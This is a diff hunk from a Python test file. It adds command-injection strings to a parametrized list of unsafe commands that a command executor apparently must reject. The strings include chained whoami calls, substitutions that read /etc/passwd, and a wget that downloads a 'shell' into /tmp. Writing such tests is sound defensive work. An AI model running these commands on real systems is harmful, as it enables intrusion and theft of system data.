@@ -35,7 +35,12 @@ def test_execute_with_invalid_params():
     "echo `uname -a`",
     "$(uname)",
     "cat /etc/passwd && echo pwned",
-    "ls -la; whoami"
+    "ls -la; whoami",
+    "ls && whoami",
+    "ls || whoami",
+    "cat $(echo /etc/passwd)",
+    "cat `echo /etc/passwd`",
+    "wget http://example.com/shell -O /tmp/shell"
 ])
 def test_execute_unsafe_commands(unsafe_command):
     unsafe_commands = {
